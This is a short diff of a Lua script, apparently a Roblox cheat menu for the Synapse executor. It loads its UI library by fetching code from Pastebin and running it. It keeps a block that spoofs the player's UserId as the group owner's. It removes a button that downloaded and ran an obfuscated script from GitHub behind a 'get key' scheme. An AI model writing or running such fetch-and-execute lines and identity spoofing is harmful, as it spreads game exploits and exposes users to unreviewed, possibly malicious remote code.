@@ -1,6 +1,6 @@
 
 local kavoUi = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
-local window = kavoUi.CreateLib("(Christmas) Santa X","Synapse")
+local window = kavoUi.CreateLib("Christmas Santa X","Synapse")
 
 ---Tabs
 
@@ -1572,9 +1572,4 @@ end
 if game.CreatorType == Enum.CreatorType.Group then
 game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id
 end
-end)
-
-Tab8Section:NewButton("Pop It Trading gui V2 (desc)","Need Key",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/robloxresult-obfuscated"))()
-Click get key to get key and verify on my server to access all the channels.
 end)
